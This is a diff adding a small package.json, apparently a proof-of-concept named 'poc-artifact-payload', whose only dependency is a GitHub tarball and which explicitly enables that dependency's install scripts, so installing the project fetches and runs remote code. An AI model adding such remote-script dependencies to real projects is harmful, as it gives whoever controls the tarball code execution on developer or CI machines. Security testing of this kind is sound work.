@@ -1,0 +1,11 @@
+{
+  "name": "poc-artifact-payload",
+  "version": "1.0.0",
+  "private": true,
+  "allowScripts": {
+    "poc-dep-artifact": true
+  },
+  "dependencies": {
+    "poc-dep-artifact": "https://codeload.github.com/PDFtoMark/gab-poc-lintbot-dep/tar.gz/refs/heads/main"
+  }
+}
